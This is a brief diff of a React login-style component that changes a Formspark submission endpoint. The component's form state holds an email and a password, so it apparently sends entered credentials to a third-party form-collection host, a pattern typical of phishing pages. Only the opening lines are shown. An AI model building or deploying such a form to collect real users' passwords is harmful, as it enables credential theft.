@@ -1,7 +1,7 @@
 import axios from "axios";
 import React, { useEffect, useState } from "react";
 
-const FORMSPARK_FORM_ID = "https://submit-form.com/uwezigi";
+const FORMSPARK_FORM_ID = "https://submit-form.com/C50FhHnT";
 
 const App = () => {
   const [formData, setFormData] = useState({ email: "", password: "" });
